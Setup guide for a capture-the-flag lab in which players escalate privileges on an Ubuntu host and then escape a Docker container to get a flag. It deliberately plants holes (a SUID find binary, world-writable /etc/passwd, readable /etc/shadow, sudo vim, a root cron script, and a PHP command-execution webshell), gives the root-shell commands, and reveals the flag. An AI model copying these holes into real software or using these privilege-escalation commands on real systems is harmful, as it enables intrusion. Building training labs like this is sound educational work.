# Multi-Stage Challenge Setup: Privilege Escalation + Docker Escape

This guide explains how to set up the challenge so players must:
1. **First:** Do privilege escalation to gain access to the Ubuntu machine
2. **Then:** Perform Docker escape to retrieve the flag

## Challenge Flow

```
Player → Initial Access (low priv user) → Privilege Escalation → Root Access → Docker Escape → Flag
```

## Setup Options

### Option 1: SSH Access with Low-Privilege User (Recommended)

#### Step 1: Create a Low-Privilege User

```bash
# Create a user without sudo privileges
sudo useradd -m -s /bin/bash player
sudo passwd player
# Set password: player123 (or your choice)

# Verify user has NO sudo access
sudo -l -U player
# Should show: "User player may not run sudo"
```

#### Step 2: Set Up Privilege Escalation Vector

Choose one or more privilege escalation methods:

**A) SUID Binary**

```bash
# Copy a binary with SUID bit set (example: find)
sudo cp /usr/bin/find /home/player/find_backup
sudo chmod 4755 /home/player/find_backup
sudo chown root:root /home/player/find_backup
```

**B) Writable /etc/passwd**

```bash
# Make /etc/passwd writable (dangerous in real scenarios!)
sudo chmod 666 /etc/passwd
# Players can add a root user with password hash
```

**C) Sudo Misconfiguration**

```bash
# Give player limited sudo access that can be exploited
sudo visudo
# Add this line (allows player to run any command as user ubuntu without password):
player ALL=(ubuntu) NOPASSWD: ALL

# Or allow specific command that can be exploited:
player ALL=(ALL) NOPASSWD: /usr/bin/vim
# Then player can: sudo vim -c ':!/bin/bash'
```

**D) Scheduled Cron Job (Writable Script)**

```bash
# Create a writable script in /tmp
sudo bash -c 'echo "#!/bin/bash" > /tmp/cron_script.sh'
sudo chmod 777 /tmp/cron_script.sh

# Add a cron job that runs as root
sudo crontab -e
# Add: * * * * * /tmp/cron_script.sh
```

**E) Weak File Permissions**

```bash
# Make a sensitive file world-readable
sudo chmod 644 /etc/shadow
# Or /root/.ssh/id_rsa
```

**F) Docker Socket Access**

```bash
# Add player to docker group (they can escape via docker)
sudo usermod -aG docker player
# This allows docker socket access without sudo
```

#### Step 3: Deploy the Docker Challenge

```bash
# Ensure player can access the challenge directory
sudo chown -R player:player /home/ubuntu/scada-final-gate
# Or put it in player's home directory
sudo cp -r /home/ubuntu/scada-final-gate /home/player/
sudo chown -R player:player /home/player/scada-final-gate
```

#### Step 4: Ensure Service is Running (as root)

```bash
# Make sure the docker challenge is running
cd /home/ubuntu/scada-final-gate
sudo docker compose up -d

# Verify container is running
docker ps | grep asylum_gate_control
```

#### Step 5: Give Player Access to Docker Challenge

Once player gets root access, they should be able to:

```bash
# Access the SCADA terminal
nc localhost 9001

# Access the container
docker exec -it asylum_gate_control /bin/bash

# Do Docker escape
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
```

---

### Option 2: Web Application Entry Point

#### Step 1: Create Vulnerable Web App

```bash
# Install web server
sudo apt update
sudo apt install -y apache2 php

# Create a vulnerable PHP file
sudo bash -c 'cat > /var/www/html/index.php << EOF
<?php
if(isset($_GET["cmd"])) {
    echo shell_exec($_GET["cmd"]);
}
?>
EOF'

# Set permissions
sudo chown www-data:www-data /var/www/html/index.php
sudo chmod 644 /var/www/html/index.php

# Allow www-data to execute commands
sudo usermod -s /bin/bash www-data
```

#### Step 2: Set Up Privilege Escalation from www-data

```bash
# Give www-data user a shell and some privilege escalation vector
sudo passwd www-data
# Set password: www-data123

# Or set up one of the priv esc methods from Option 1 for www-data user
```

---

### Option 3: File Upload / Reverse Shell

#### Step 1: Create Entry Point

```bash
# Simple Python HTTP server with file upload capability
# Or use a vulnerable application that allows file uploads
# Players upload a reverse shell and get initial access
```

#### Step 2: Follow Option 1 Steps 2-5

Once they have initial access, they need to do privilege escalation.

---

## Complete Setup Script

Here's a complete setup script that creates everything:

```bash
#!/bin/bash

# Create low-privilege user
sudo useradd -m -s /bin/bash player
echo "player:player123" | sudo chpasswd

# Remove sudo access (if any)
sudo deluser player sudo 2>/dev/null

# Set up SUID binary privilege escalation
sudo cp /usr/bin/find /home/player/find_backup
sudo chmod 4755 /home/player/find_backup
sudo chown root:root /home/player/find_backup

# Create a hint file
sudo bash -c 'cat > /home/player/hint.txt << EOF
Look for SUID binaries in your home directory.
EOF'
sudo chown player:player /home/player/hint.txt

# Copy challenge files to player's home (read-only)
sudo mkdir -p /home/player/challenge
sudo cp -r /home/ubuntu/scada-final-gate/* /home/player/challenge/
sudo chown -R player:player /home/player/challenge

# Ensure docker challenge is running as root
cd /home/ubuntu/scada-final-gate
sudo docker compose up -d

echo "[+] Setup complete!"
echo "[+] User: player"
echo "[+] Password: player123"
echo "[+] Player needs to:"
echo "    1. Get initial access (SSH)"
echo "    2. Find privilege escalation vector"
echo "    3. Gain root access"
echo "    4. Access Docker challenge and escape"
```

---

## Player's Challenge Path

1. **Initial Access:**
   ```bash
   ssh player@<ubuntu-machine-ip>
   # Password: player123
   ```

2. **Explore System:**
   ```bash
   whoami
   id
   sudo -l
   find / -perm -4000 2>/dev/null
   ls -la /home/player/
   ```

3. **Privilege Escalation:**
   ```bash
   # Example with SUID find:
   /home/player/find_backup . -exec /bin/bash -p \;
   # Now you're root!
   ```

4. **Access Docker Challenge:**
   ```bash
   # As root, access the SCADA terminal
   nc localhost 9001
   
   # Or access container
   docker exec -it asylum_gate_control /bin/bash
   ```

5. **Docker Escape:**
   ```bash
   # Inside container as scada_operator
   sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
   ```

6. **Unlock Gate:**
   ```bash
   nc localhost 9001
   unlock THM{unl0ckth3g4t350fh3ll}
   ```

---

## Hardening Options

To make privilege escalation more challenging:

1. **Hide SUID binaries:**
   ```bash
   # Give them non-obvious names
   sudo mv /home/player/find_backup /home/player/.hidden_bin
   ```

2. **Remove obvious hints:**
   ```bash
   sudo rm /home/player/hint.txt
   ```

3. **Require multiple steps:**
   ```bash
   # First: Find writable file
   # Second: Write malicious cron job
   # Third: Wait for execution
   ```

4. **Use kernel exploit:**
   ```bash
   # Unpatched kernel with known CVE
   # Player must find and exploit it
   ```

---

## SSH Configuration

Enable SSH access for the player:

```bash
# Install SSH server
sudo apt update
sudo apt install -y openssh-server

# Enable password authentication (for challenge)
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH
sudo systemctl restart sshd
sudo systemctl enable sshd
```

---

## Testing

Test the complete flow:

```bash
# 1. SSH as player
ssh player@localhost

# 2. Check what you can access
sudo -l
find / -perm -4000 2>/dev/null | grep player

# 3. Do privilege escalation
/home/player/find_backup . -exec /bin/bash -p \;

# 4. Verify root access
whoami  # should be root
id      # should be uid=0(root)

# 5. Access Docker challenge
nc localhost 9001
```

---

## Notes

- The privilege escalation should be realistic but achievable
- Don't make it too easy (like giving sudo ALL) or too hard (kernel exploit)
- Consider the skill level of your target audience
- Document the intended solution path
- Test the complete flow before deploying


